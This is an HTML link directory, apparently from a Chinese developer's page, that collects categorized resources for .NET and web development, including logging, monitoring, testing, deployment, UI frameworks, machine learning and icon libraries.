<h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p><a href="https://github.com/serilog/serilog/wiki" target="_blank" rel="noopener">Serilog</a><br><a href="https://github.com/serilog/serilog-aspnetcore" target="_blank" rel="noopener">Serilog.AspNetCore</a><br><a href="https://github.com/serilog/serilog-sinks-console" target="_blank" rel="noopener">Serilog.Sinks.Console</a><br><a href="https://github.com/serilog/serilog-sinks-file" target="_blank" rel="noopener">Serilog.Sinks.File</a><br><a href="https://github.com/serilog/serilog-sinks-async" target="_blank" rel="noopener">Serilog.Sinks.Async</a><br><a href="https://github.com/serilog/serilog-sinks-seq" target="_blank" rel="noopener">Serilog.Sinks.Seq</a><br><a href="https://github.com/NLog/NLog/wiki" target="_blank" rel="noopener">NLog</a><br><a href="https://logging.apache.org/log4net/" target="_blank" rel="noopener">log4net</a><br><a href="https://github.com/logary/logary" target="_blank" rel="noopener">Logary</a><br><a href="https://github.com/elmah/Elmah" target="_blank" rel="noopener">Elmah</a>  </p>
<h3 id="状态监控"><a href="#状态监控" class="headerlink" title="状态监控"></a>状态监控</h3><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html" target="_blank" rel="noopener">Elasticsearch</a><br><a href="https://www.elastic.co/guide/en/kibana/current/index.html" target="_blank" rel="noopener">Kibana</a><br><a href="https://www.elastic.co/guide/en/logstash/current/index.html" target="_blank" rel="noopener">Logstash</a><br><a href="https://github.com/fluent/fluentd" target="_blank" rel="noopener">Fluentd</a><br><a href="https://github.com/apache/skywalking" target="_blank" rel="noopener">SkyWalking</a><br><a href="https://www.app-metrics.io/" target="_blank" rel="noopener">AppMetrics</a><br><a href="https://docs.influxdata.com/influxdb/" target="_blank" rel="noopener">influxDB</a><br><a href="https://grafana.com/docs/grafana/" target="_blank" rel="noopener">Grafana</a><br><a href="https://github.com/grafana/loki" target="_blank" rel="noopener">Loki</a><br><a href="https://github.com/exceptionless/Exceptionless" target="_blank" rel="noopener">Exceptionless</a><br><a href="https://github.com/Xabaril/AspNetCore.Diagnostics.HealthChecks" target="_blank" rel="noopener">AspNetCore.Diagnostics.HealthChecks</a><br><a href="https://github.com/SpringLeee/HttpReports" target="_blank" rel="noopener">HttpReports</a><br><a href="https://github.com/getsentry/sentry" target="_blank" rel="noopener">Sentry</a><br><a href="https://github.com/jyolo/wLogger" target="_blank" rel="noopener">wLogger</a><br><a href="https://github.com/MiniProfiler/dotnet" target="_blank" rel="noopener">MiniProfiler</a><br><a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a><br><a href="https://github.com/prometheus-net/prometheus-net" target="_blank" rel="noopener">prometheus-net</a><br><a href="https://github.com/djluck/prometheus-net.DotNetRuntime" target="_blank" rel="noopener">prometheus-net.DotNetMetrics</a><br><a href="https://github.com/PrometheusClientNet/Prometheus.Client" target="_blank" rel="noopener">Prometheus.Client</a><br><a href="https://github.com/jaegertracing/jaeger" target="_blank" rel="noopener">Jaeger</a><br><a href="https://github.com/jaegertracing/jaeger-client-csharp" target="_blank" rel="noopener">C# Client for Jaeger</a><br><a href="https://github.com/itsvse/CLRStats" target="_blank" rel="noopener">CLRStats</a><br><a href="https://github.com/open-telemetry/opentelemetry-dotnet/" target="_blank" rel="noopener">OpenTelemetry .NET</a>  </p>
<h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p><a href="https://github.com/coverlet-coverage/coverlet" target="_blank" rel="noopener">Coverlet</a><br><a href="https://github.com/danielpalme/ReportGenerator" target="_blank" rel="noopener">ReportGenerator</a><br><a href="https://xunit.net/#documentation" target="_blank" rel="noopener">xUnit</a><br><a href="https://github.com/nunit/docs/wiki" target="_blank" rel="noopener">NUnit</a><br><a href="https://github.com/moq/moq4/wiki" target="_blank" rel="noopener">Moq</a><br><a href="https://nsubstitute.github.io/help.html" target="_blank" rel="noopener">NSubstitute</a><br><a href="https://shouldly.readthedocs.io/" target="_blank" rel="noopener">Shouldly</a><br><a href="https://fluentassertions.com/introduction" target="_blank" rel="noopener">FluentAssertions</a>  </p>
<h4 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h4><p><a href="https://github.com/pengweiqhca/Xunit.DependencyInjection" target="_blank" rel="noopener">Xunit.DependencyInjection</a>  </p>
<h3 id="其它测试"><a href="#其它测试" class="headerlink" title="其它测试"></a>其它测试</h3><p><a href="https://github.com/IKende/WebApiBenchmark" target="_blank" rel="noopener">Web Api benchmark</a><br><a href="https://www.postman.com/" target="_blank" rel="noopener">Postman</a><br><a href="https://hoppscotch.io/" target="_blank" rel="noopener">Hoppscotch</a><br><a href="https://github.com/fullstorydev/grpcurl" target="_blank" rel="noopener">gRPCurl</a><br><a href="https://github.com/fullstorydev/grpcui" target="_blank" rel="noopener">gRPC UI</a><br><a href="https://www.speedscope.app/" target="_blank" rel="noopener">speedscope</a><br><a href="https://github.com/httptoolkit/httptoolkit" target="_blank" rel="noopener">HTTP Toolkit</a><br><a href="https://github.com/guardicore/monkey" target="_blank" rel="noopener">Infection Monkey</a><br><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">xray</a><br><a href="https://github.com/cypress-io/cypress" target="_blank" rel="noopener">Cypress</a><br><a href="https://github.com/zhzyker/vulmap" target="_blank" rel="noopener">Vulmap</a><br><a href="https://github.com/gh0stkey/Web-Fuzzing-Box" target="_blank" rel="noopener">Web-Fuzzing-Box</a><br><a href="https://github.com/SeleniumHQ/selenium" target="_blank" rel="noopener">Selenium</a><br><a href="https://github.com/codesenberg/bombardier" target="_blank" rel="noopener">bombardier</a>  </p>
<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p><a href="https://github.com/icsharpcode/ILSpy" target="_blank" rel="noopener">ILSpy</a><br><a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="noopener">dnSpy</a>  </p>
<h3 id="托管部署"><a href="#托管部署" class="headerlink" title="托管部署"></a>托管部署</h3><p><a href="https://github.com/madskristensen/BundlerMinifier" target="_blank" rel="noopener">BundlerMinifier</a><br><a href="https://git-scm.com/doc" target="_blank" rel="noopener">Git</a><br><a href="https://tortoisegit.org/" target="_blank" rel="noopener">TortoiseGit</a><br><a href="https://www.atlassian.com/zh/software/sourcetree" target="_blank" rel="noopener">Sourcetree</a><br><a href="https://podman.io/" target="_blank" rel="noopener">Podman</a><br><a href="https://docs.docker.com/" target="_blank" rel="noopener">Docker</a><br><a href="https://github.com/jesseduffield/lazydocker" target="_blank" rel="noopener">LazyDocker</a><br><a href="https://www.portainer.io/" target="_blank" rel="noopener">Portainer.io</a><br><a href="https://helm.sh/" target="_blank" rel="noopener">Helm</a><br><a href="https://github.com/caddyserver/caddy" target="_blank" rel="noopener">Caddy</a><br><a href="https://kubernetes.io/docs/concepts/" target="_blank" rel="noopener">Kubernetes</a><br><a href="https://github.com/lensapp/lens" target="_blank" rel="noopener">Lens | The Kubernetes IDE</a><br><a href="https://github.com/linkerd/linkerd2" target="_blank" rel="noopener">Linkerd</a><br><a href="https://github.com/rancher/k3s" target="_blank" rel="noopener">K3s</a><br><a href="https://jenkins.io/zh/doc/" target="_blank" rel="noopener">Jenkins</a><br><a href="https://k8syaml.com/" target="_blank" rel="noopener">Kubernetes YAML Generator</a><br><a href="https://github.com/WELL-E/AutoUpdater" target="_blank" rel="noopener">AutoUpdater</a><br><a href="https://github.com/upx/upx" target="_blank" rel="noopener">UPX</a><br><a href="https://github.com/FiloSottile/mkcert" target="_blank" rel="noopener">mkcert（本地SSL证书）</a>  </p>
<h3 id="注释文档生成"><a href="#注释文档生成" class="headerlink" title="注释文档生成"></a>注释文档生成</h3><p><a href="https://submain.com/products/ghostdoc.aspx" target="_blank" rel="noopener">GhostDoc</a><br><a href="http://ndoc.sourceforge.net/" target="_blank" rel="noopener">NDoc</a>  </p>
<h3 id="混淆工具"><a href="#混淆工具" class="headerlink" title="混淆工具"></a>混淆工具</h3><p><a href="https://github.com/obfuscar/obfuscar" target="_blank" rel="noopener">Obfuscar</a>  </p>
<h3 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h3><p><a href="https://github.com/elsa-workflows/elsa-core" target="_blank" rel="noopener">Elsa Workflows</a>  </p>
<h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p><a href="https://github.com/happyfish100/fastdfs" target="_blank" rel="noopener">FastDFS</a><br><a href="https://github.com/minio/minio" target="_blank" rel="noopener">MinIO</a><br><a href="https://github.com/chinhdo/txFileManager" target="_blank" rel="noopener">.NET Transactional File Manager</a><br><a href="https://github.com/ciur/papermerge" target="_blank" rel="noopener">Papermerge</a><br><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Wizard 开源文档管理系统</a><br><a href="http://iscute.cn/chfs" target="_blank" rel="noopener">CuteHttpFileServer</a>  </p>
<h3 id="集成架构"><a href="#集成架构" class="headerlink" title="集成架构"></a>集成架构</h3><p><a href="https://github.com/SteveSandersonMS/WebWindow" target="_blank" rel="noopener">WebWindow</a><br><a href="https://github.com/TripleView/SummerBoot" target="_blank" rel="noopener">SummerBoot</a><br><a href="https://github.com/anet-team/anet" target="_blank" rel="noopener">Anet</a><br><a href="https://github.com/AlphaYu/Adnc" target="_blank" rel="noopener">Adnc</a><br><a href="https://github.com/ChengLab/AAFrameWork" target="_blank" rel="noopener">AA.FrameWork</a><br><a href="https://github.com/duyanming/Viper" target="_blank" rel="noopener">Viper</a><br><a href="https://github.com/monksoul/Fur" target="_blank" rel="noopener">Fur</a><br><a href="https://github.com/DestinyCore/Destiny.Core.Flow" target="_blank" rel="noopener">Destiny.Core.Flow</a><br><a href="https://github.com/yiyungent/Remember.Core" target="_blank" rel="noopener">Remember.Core</a><br><a href="https://github.com/dotnetcore/WTM" target="_blank" rel="noopener">WalkingTec.Mvvm</a><br><a href="https://github.com/NancyFx/Nancy/" target="_blank" rel="noopener">Nancy</a><br><a href="https://github.com/apache/pulsar/" target="_blank" rel="noopener">Pulsar</a>  </p>
<h4 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h4><p><a href="http://cap.dotnetcore.xyz/user-guide/zh/getting-started/quick-start/" target="_blank" rel="noopener">CAP</a><br><a href="https://github.com/dotnetcore/surging" target="_blank" rel="noopener">Surging</a><br><a href="http://dotnet.github.io/orleans/Documentation/" target="_blank" rel="noopener">Orleans</a><br><a href="https://github.com/dapr/dapr/wiki" target="_blank" rel="noopener">Dapr</a><br><a href="https://steeltoe.io/docs/" target="_blank" rel="noopener">Steeltoe</a><br><a href="https://github.com/istio/istio" target="_blank" rel="noopener">Istio</a><br><a href="https://github.com/simpleway2016/JMS" target="_blank" rel="noopener">JMS</a><br><a href="https://github.com/duyanming/Anno.Core" target="_blank" rel="noopener">Anno</a><br><a href="https://github.com/NewLifeX/Stardust" target="_blank" rel="noopener">星尘</a>  </p>
<h4 id="ASP-NET-Core"><a href="#ASP-NET-Core" class="headerlink" title="ASP.NET Core"></a>ASP.NET Core</h4><p><a href="https://docs.abp.io/zh-Hans/abp/master/" target="_blank" rel="noopener">ABP</a><br><a href="https://github.com/i66soft/osharp" target="_blank" rel="noopener">OSharp</a><br><a href="https://github.com/mbpframework/Mbp" target="_blank" rel="noopener">Mbp</a><br><a href="https://github.com/cloudscribe/cloudscribe" target="_blank" rel="noopener">cloudscribe</a><br><a href="https://github.com/Finbuckle/Finbuckle.MultiTenant" target="_blank" rel="noopener">Finbuckle.MultiTenant</a><br><a href="https://github.com/saaskit/saaskit" target="_blank" rel="noopener">SaasKit</a><br><a href="https://github.com/OrchardCMS/OrchardCore" target="_blank" rel="noopener">Orchard Core</a>  </p>
<h4 id="WPF"><a href="#WPF" class="headerlink" title="WPF"></a>WPF</h4><p><a href="http://prismlibrary.github.io/docs/" target="_blank" rel="noopener">Prism</a><br><a href="https://reactiveui.net/docs/" target="_blank" rel="noopener">ReactiveUI</a><br><a href="https://github.com/lbugnion/mvvmlight" target="_blank" rel="noopener">MVVM Light</a>  </p>
<h4 id="跨平台客户端"><a href="#跨平台客户端" class="headerlink" title="跨平台客户端"></a>跨平台客户端</h4><p><a href="https://github.com/AvaloniaUI/Avalonia" target="_blank" rel="noopener">Avalonia</a><br><a href="https://github.com/ElectronNET/Electron.NET" target="_blank" rel="noopener">Electron.NET</a><br><a href="https://platform.uno/" target="_blank" rel="noopener">Uno Platform</a>  </p>
<h3 id="Web-UI"><a href="#Web-UI" class="headerlink" title="Web UI"></a>Web UI</h3><p><a href="https://angular.io/docs" target="_blank" rel="noopener">Angular</a><br><a href="https://cn.vuejs.org/" target="_blank" rel="noopener">Vue</a><br><a href="https://zh-hans.reactjs.org/docs/" target="_blank" rel="noopener">React</a><br><a href="https://datatables.net/manual/" target="_blank" rel="noopener">DataTables</a><br><a href="https://github.com/alyssaxuu/flowy" target="_blank" rel="noopener">Flowy</a><br><a href="http://echarts.apache.org/" target="_blank" rel="noopener">ECharts</a><br><a href="https://github.com/antvis/g2/" target="_blank" rel="noopener">G2</a><br><a href="http://docs.mathjax.org/" target="_blank" rel="noopener">MathJax</a><br><a href="https://github.com/KaTeX/KaTeX" target="_blank" rel="noopener">KaTeX</a><br><a href="https://getbootstrap.com/docs/" target="_blank" rel="noopener">Bootstrap</a><br><a href="https://ng-bootstrap.github.io/#/getting-started" target="_blank" rel="noopener">NG-Bootstrap</a><br><a href="https://github.com/ArgoZhang/BootstrapBlazor" target="_blank" rel="noopener">BootstrapBlazor</a><br><a href="https://ant.design/docs/react/introduce-cn" target="_blank" rel="noopener">Ant Design of React</a><br><a href="https://ng.ant.design/docs/introduce/zh" target="_blank" rel="noopener">Ant Design of Angular</a><br><a href="https://vue.ant.design/docs/vue/introduce/" target="_blank" rel="noopener">Ant Design of Vue</a><br><a href="https://github.com/ant-design-blazor/ant-design-blazor" target="_blank" rel="noopener">Ant Design Blazor</a><br><a href="https://material.angular.io/components/categories" target="_blank" rel="noopener">Angular Material</a><br><a href="https://github.com/SamProf/MatBlazor" target="_blank" rel="noopener">MatBlazor</a><br><a href="https://github.com/Element-Blazor/Element-Blazor" target="_blank" rel="noopener">Element-Blazor</a><br><a href="https://github.com/microsoft/FeatureManagement-Dotnet" target="_blank" rel="noopener">FeatureManagement</a><br><a href="https://github.com/mengshukeji/Luckysheet" target="_blank" rel="noopener">LuckySheet</a><br><a href="https://github.com/sparrow-js/sparrow" target="_blank" rel="noopener">Sparrow</a><br><a href="https://github.com/jerosoler/Drawflow" target="_blank" rel="noopener">Drawflow</a><br><a href="https://github.com/mapbox/mapbox-gl-js" target="_blank" rel="noopener">Mapbox GL JS</a><br><a href="https://github.com/Jannchie/anichart.js" target="_blank" rel="noopener">AniChart.js</a><br><a href="https://github.com/apache/superset" target="_blank" rel="noopener">Superset</a><br><a href="https://github.com/revolist/revogrid" target="_blank" rel="noopener">RevoGrid</a>  </p>
<h4 id="建模"><a href="#建模" class="headerlink" title="建模"></a>建模</h4><p><a href="https://github.com/felixpalmer/procedural-gl-js" target="_blank" rel="noopener">procedural-gl.js</a>  </p>
<h3 id="WPF-1"><a href="#WPF-1" class="headerlink" title="WPF"></a>WPF</h3><p><a href="https://github.com/windows-toolkit/Microsoft.Toolkit.Win32" target="_blank" rel="noopener">Windows Community Toolkit - WPF and Windows Forms</a><br><a href="https://www.nuget.org/packages/Microsoft.Web.WebView2" target="_blank" rel="noopener">Microsoft.Web.WebView2</a><br><a href="https://github.com/Fody/PropertyChanged" target="_blank" rel="noopener">PropertyChanged.Fody</a><br><a href="https://github.com/HandyOrg/HandyControl" target="_blank" rel="noopener">HandyControl</a><br><a href="https://github.com/MahApps/MahApps.Metro" target="_blank" rel="noopener">MahApps.Metro</a><br><a href="https://github.com/MaterialDesignInXAML/MaterialDesignInXamlToolkit" target="_blank" rel="noopener">MaterialDesignInXamlToolkit</a><br><a href="https://github.com/spiegelp/MaterialDesignExtensions" target="_blank" rel="noopener">MaterialDesignExtensions</a><br><a href="https://github.com/Kinnara/ModernWpf" target="_blank" rel="noopener">ModernWPF UI Library</a><br><a href="https://github.com/aduskin/AduSkin" target="_blank" rel="noopener">AduSkin</a><br><a href="https://github.com/benruehl/adonis-ui" target="_blank" rel="noopener">Adonis UI</a><br><a href="https://github.com/Panuon/PanuonUI.Silver" target="_blank" rel="noopener">PanuonUI.Silver</a><br><a href="https://github.com/DinoChan/Kino.Toolkit.Wpf" target="_blank" rel="noopener">Kino.Toolkit.Wpf</a><br><a href="https://github.com/sourcechord/FluentWPF" target="_blank" rel="noopener">FluentWPF</a><br><a href="https://github.com/ButchersBoy/Dragablz" target="_blank" rel="noopener">Dragablz</a><br><a href="https://github.com/Live-Charts/Live-Charts" target="_blank" rel="noopener">LiveCharts</a><br><a href="https://github.com/cefsharp/CefSharp" target="_blank" rel="noopener">CefSharp</a><br><a href="https://github.com/helix-toolkit/helix-toolkit" target="_blank" rel="noopener">Helix Toolkit</a><br><a href="https://github.com/dotnetprojects/WpfToolkit" target="_blank" rel="noopener">Wpf Toolkit</a><br><a href="https://github.com/dotnetprojects/WpfExtendedToolkit" target="_blank" rel="noopener">Wpf Extended Toolkit</a><br><a href="https://github.com/xceedsoftware/wpftoolkit" target="_blank" rel="noopener">Extended WPF Toolkit™ by Xceed</a><br><a href="https://github.com/imnbwd/WpfWindowToolkit" target="_blank" rel="noopener">WpfWindowToolkit</a>  </p>
<h4 id="安装打包"><a href="#安装打包" class="headerlink" title="安装打包"></a>安装打包</h4><p><a href="https://jrsoftware.org/isinfo.php" target="_blank" rel="noopener">Inno Setup</a><br><a href="https://www.advancedinstaller.com/" target="_blank" rel="noopener">Advanced Installer</a>  </p>
<h3 id="UWP"><a href="#UWP" class="headerlink" title="UWP"></a>UWP</h3><p><a href="https://github.com/microsoft/microsoft-ui-xaml" target="_blank" rel="noopener">WinUI</a><br><a href="https://github.com/windows-toolkit/WindowsCommunityToolkit" target="_blank" rel="noopener">Windows Community Toolkit</a>  </p>
<h3 id="游戏设计"><a href="#游戏设计" class="headerlink" title="游戏设计"></a>游戏设计</h3><p><a href="https://docs.unity3d.com/Manual/" target="_blank" rel="noopener">Unity3D</a><br><a href="https://github.com/FlaxEngine/FlaxEngine" target="_blank" rel="noopener">Flax Engine</a>  </p>
<h3 id="视觉软件"><a href="#视觉软件" class="headerlink" title="视觉软件"></a>视觉软件</h3><p><a href="https://github.com/emgucv/emgucv" target="_blank" rel="noopener">Emgu CV</a>  </p>
<h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p><a href="https://madewithml.com/" target="_blank" rel="noopener">Made With ML</a><br><a href="https://github.com/tensorflow/tensorflow" target="_blank" rel="noopener">TensorFlow</a><br><a href="https://github.com/microsoft/ailab" target="_blank" rel="noopener">AI Lab</a><br><a href="https://github.com/accord-net/framework" target="_blank" rel="noopener">Accord.NET</a><br><a href="https://botsharp.readthedocs.io/" target="_blank" rel="noopener">BotSharp</a><br><a href="https://github.com/SciSharp/NumSharp" target="_blank" rel="noopener">NumSharp</a><br><a href="https://github.com/SciSharp/SiaNet" target="_blank" rel="noopener">SiaNet</a><br><a href="https://github.com/SciSharp/Pandas.NET" target="_blank" rel="noopener">Pandas.NET</a><br><a href="https://github.com/microsoft/DeepSpeed" target="_blank" rel="noopener">DeepSpeed</a><br><a href="https://github.com/andrewkirillov/AForge.NET" target="_blank" rel="noopener">AForge.NET</a><br><a href="https://github.com/fslaborg/Deedle" target="_blank" rel="noopener">Deedle</a><br><a href="https://trustmlvis.lnu.se/" target="_blank" rel="noopener">TrustMLVis Browser</a><br><a href="https://textvis.lnu.se/" target="_blank" rel="noopener">Text Visualization Browser</a>  </p>
<h3 id="图像识别"><a href="#图像识别" class="headerlink" title="图像识别"></a>图像识别</h3><p><a href="https://github.com/opencv/opencv" target="_blank" rel="noopener">OpenCV</a><br><a href="https://github.com/PaddlePaddle/PaddleOCR" target="_blank" rel="noopener">PaddleOCR</a><br><a href="https://github.com/tesseract-ocr/tesseract" target="_blank" rel="noopener">Tesseract</a><br><a href="https://github.com/View12138/ViewFaceCore/" target="_blank" rel="noopener">ViewFaceCore</a><br><a href="https://github.com/facebookresearch/pifuhd" target="_blank" rel="noopener">PIFuHD</a>  </p>
<h3 id="文档创建"><a href="#文档创建" class="headerlink" title="文档创建"></a>文档创建</h3><p><a href="https://www.mkdocs.org/" target="_blank" rel="noopener">MkDocs</a><br><a href="https://github.com/traduora/traduora" target="_blank" rel="noopener">Traduora</a>  </p>
<h3 id="图标符号"><a href="#图标符号" class="headerlink" title="图标符号"></a>图标符号</h3><p><a href="https://icons8.com/icons" target="_blank" rel="noopener">Icons8</a><br><a href="https://materialdesignicons.com/" target="_blank" rel="noopener">Material Design Icons</a><br><a href="https://www.iconfont.cn/" target="_blank" rel="noopener">IconFont 阿里巴巴矢量图标库</a><br><a href="https://github.com/bytedance/IconPark" target="_blank" rel="noopener">IconPark</a><br><a href="https://icons.getbootstrap.com/" target="_blank" rel="noopener">Bootstrap Icons</a><br><a href="http://remixicon.com/" target="_blank" rel="noopener">Remix Icon</a><br><a href="https://www.flaticon.com/" target="_blank" rel="noopener">FlatIcon</a><br><a href="https://pattern.flaticon.com/" target="_blank" rel="noopener">FlatIcon Pattern</a><br><a href="https://phosphoricons.com/" target="_blank" rel="noopener">Phosphor</a><br><a href="https://tablericons.com/" target="_blank" rel="noopener">Tabler Icons</a><br><a href="https://fontawesome.com/" target="_blank" rel="noopener">Font Awesome</a><br><a href="https://realfavicongenerator.net/" target="_blank" rel="noopener">Favicon</a><br><a href="https://www.websiteplanet.com/webtools/favicon-generator/" target="_blank" rel="noopener">Favicon Generator</a><br><a href="https://github.com/Yqnn/svg-path-editor" target="_blank" rel="noopener">SvgPathEditor</a><br><a href="https://unicode-table.com/" target="_blank" rel="noopener">Unicode</a><br><a href="https://emojipedia.org/" target="_blank" rel="noopener">Emojipedia</a><br><a href="https://illlustrations.co/" target="_blank" rel="noopener">illlustrations</a><br><a href="https://www.irasutoya.com/" target="_blank" rel="noopener">いらすとや</a><br><a href="https://www.chuangkit.com/" target="_blank" rel="noopener">创客贴</a><br><a href="https://openclipart.org/" target="_blank" rel="noopener">Openclipart</a><br><a href="https://freesvg.org/" target="_blank" rel="noopener">Free SVG</a><br><a href="https://www.pixeltrue.com/free-illustrations" target="_blank" rel="noopener">Free Vector Illustrations - pixeltrue</a><br><a href="https://all-free-download.com/" target="_blank" rel="noopener">All-free-download</a><br><a href="https://delesign.com/" target="_blank" rel="noopener">DELESIGN</a><br><a href="https://icons8.com/animated-icons" target="_blank" rel="noopener">Animated Icons</a><br><a href="https://icons8.com/illustrations" target="_blank" rel="noopener">OUCH!</a>  </p>
<h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p><a href="https://freemusicarchive.org/" target="_blank" rel="noopener">Free Music Archive</a><br><a href="https://icons8.com/music" target="_blank" rel="noopener">Fugue</a>  </p>
<h3 id="音效"><a href="#音效" class="headerlink" title="音效"></a>音效</h3><p><a href="https://freesound.org/" target="_blank" rel="noopener">FreeSound</a>  </p>
<h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p><a href="https://docs.microsoft.com/zh-cn/sql/t-sql/" target="_blank" rel="noopener">T-SQL</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML" target="_blank" rel="noopener">HTML</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">CSS</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript" target="_blank" rel="noopener">JavaScript</a><br><a href="https://api.jquery.com/" target="_blank" rel="noopener">jQuery</a><br><a href="https://www.typescriptlang.org/docs/" target="_blank" rel="noopener">TypeScript</a><br><a href="https://docs.python.org/" target="_blank" rel="noopener">Python</a><br><a href="https://doc.rust-lang.org/book/" target="_blank" rel="noopener">Rust</a><br><a href="https://docs.microsoft.com/en-us/powershell/" target="_blank" rel="noopener">PowerShell</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">正则表达式</a><br><a href="https://blog.robertelder.org/regular-expression-visualizer/" target="_blank" rel="noopener">The Regular Expression Visualizer, Simulator &amp; Cross-Compiler Tool</a>  </p>
<h2 id="Linux-系统"><a href="#Linux-系统" class="headerlink" title="Linux 系统"></a>Linux 系统</h2><p><a href="https://www.kernel.org/" target="_blank" rel="noopener">Linux kernel</a><br><a href="https://www.uniontech.com/" target="_blank" rel="noopener">统信UOS</a><br><a href="https://www.deepin.org/" target="_blank" rel="noopener">deepin</a><br><a href="https://www.debian.org/" target="_blank" rel="noopener">Debian</a><br><a href="https://www.centos.org/" target="_blank" rel="noopener">CentOS</a><br><a href="https://ubuntu.com/" target="_blank" rel="noopener">Ubuntu</a><br><a href="https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux" target="_blank" rel="noopener">RHEL</a><br><a href="https://www.archlinux.org/" target="_blank" rel="noopener">Arch Linux</a><br><a href="https://getfedora.org/" target="_blank" rel="noopener">Fedora</a><br><a href="https://www.kali.org/" target="_blank" rel="noopener">Kali Linux</a><br><a href="https://www.opensuse.org/" target="_blank" rel="noopener">openSUSE</a><br><a href="https://linuxmint.com/" target="_blank" rel="noopener">Linux Mint</a><br><a href="https://elementary.io/zh_CN/" target="_blank" rel="noopener">elementary OS</a><br><a href="https://manjaro.org/" target="_blank" rel="noopener">Manjaro</a><br><a href="https://www.gentoo.org/" target="_blank" rel="noopener">Gentoo Linux</a><br><a href="https://www.raspberrypi.org/software/" target="_blank" rel="noopener">Raspberry Pi OS</a><br><a href="https://www.gnome.org/" target="_blank" rel="noopener">GNOME</a>  </p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p><a href="https://github.com/thangchung/awesome-dotnet-core" target="_blank" rel="noopener">Awesome .NET Core 英文</a><br><a href="https://github.com/jasonhua95/awesome-dotnet-core" target="_blank" rel="noopener">Awesome .NET Core 中文</a><br><a href="https://www.cnblogs.com/zhao123/p/12201928.html" target="_blank" rel="noopener">GitHub 上优秀的 .NET Core 项目</a><br><a href="https://github.com/sladesha/Reflection_Summary" target="_blank" rel="noopener">算法理论基础知识应知应会</a><br><a href="https://github.com/aalhour/C-Sharp-Algorithms" target="_blank" rel="noopener">C# ALGORITHMS</a><br><a href="https://github.com/EduardoPires/EquinoxProject" target="_blank" rel="noopener">EquinoxProject</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">HTTP</a><br><a href="https://visualgo.net/" target="_blank" rel="noopener">VisuAlgo</a><br><a href="https://algorithm-visualizer.org/" target="_blank" rel="noopener">Algorithm Visualizer</a><br><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html" target="_blank" rel="noopener">Data Structure Visualizations</a><br><a href="https://datavizcatalogue.com/" target="_blank" rel="noopener">The Data Visualisation Catalogue</a><br><a href="https://www.connectionstrings.com/" target="_blank" rel="noopener">ConnectionStrings</a><br><a href="https://microsoft.github.io/TypeSearch/" target="_blank" rel="noopener">TypeScript Types Search</a><br><a href="https://roadmap.sh/" target="_blank" rel="noopener">Developer Roadmaps</a><br><a href="https://github.com/Asabeneh/30DaysOfJavaScript" target="_blank" rel="noopener">30DaysOfJavaScript</a><br><a href="https://github.com/wenyan-lang/wenyan" target="_blank" rel="noopener">文言文編程語言</a><br><a href="https://labuladong.gitbook.io/algo/" target="_blank" rel="noopener">labuladong的算法小抄</a><br><a href="https://github.com/grandyang/leetcode/" target="_blank" rel="noopener">LeetCode All In One</a><br><a href="https://refactoring.guru/" target="_blank" rel="noopener">Refactoring.Guru</a><br><a href="https://github.com/xjh22222228/git-manual" target="_blank" rel="noopener">Git常用命令参考手册</a><br><a href="https://github.com/k88hudson/git-flight-rules/blob/master/README_zh-CN.md" target="_blank" rel="noopener">Git飞行规则</a><br><a href="https://ihateregex.io/" target="_blank" rel="noopener">iHateRegex</a><br><a href="https://github.com/cdoco/common-regex" target="_blank" rel="noopener">CommonRegex</a><br><a href="https://devhints.io/" target="_blank" rel="noopener">Devhints</a><br><a href="https://apicoding.io/" target="_blank" rel="noopener">API Coding</a><br><a href="https://github.com/florinpop17/app-ideas" target="_blank" rel="noopener">App Ideas Collection</a><br><a href="https://opensource.builders/" target="_blank" rel="noopener">Open-source alternatives</a><br><a href="https://github.com/Microsoft/Xaml-Controls-Gallery/" target="_blank" rel="noopener">XAML Controls Gallery</a><br><a href="https://andreasbm.github.io/web-skills/" target="_blank" rel="noopener">Web Skills</a><br><a href="https://github.com/Debdut/names.io" target="_blank" rel="noopener">names.io</a><br><a href="https://learn-english.dev/" target="_blank" rel="noopener">程序员英语词汇宝典</a><br><a href="https://github.com/anael-seghezzi/CToy" target="_blank" rel="noopener">C-Toy</a><br><a href="http://nandgame.com/" target="_blank" rel="noopener">NandGame</a>  </p>
